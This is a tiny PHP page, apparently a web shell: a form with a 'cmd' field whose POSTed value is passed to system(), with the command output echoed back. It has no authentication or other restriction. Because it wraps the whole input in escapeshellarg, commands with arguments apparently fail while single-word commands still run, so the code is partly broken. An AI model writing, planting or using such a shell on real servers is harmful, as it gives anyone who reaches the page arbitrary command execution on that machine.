<?php

    if ($_SERVER["REQUEST_METHOD"]==='POST') {
        $cmd = escapeshellarg($_POST["cmd"]);
        var_dump($cmd);
        echo "<pre>";
        $comand = system($cmd, $return);
        echo "</pre>";
    }
    


?>

<form method="post">
    <input type="text" name="cmd">
    <button type="submit">Enviar</button>
</form>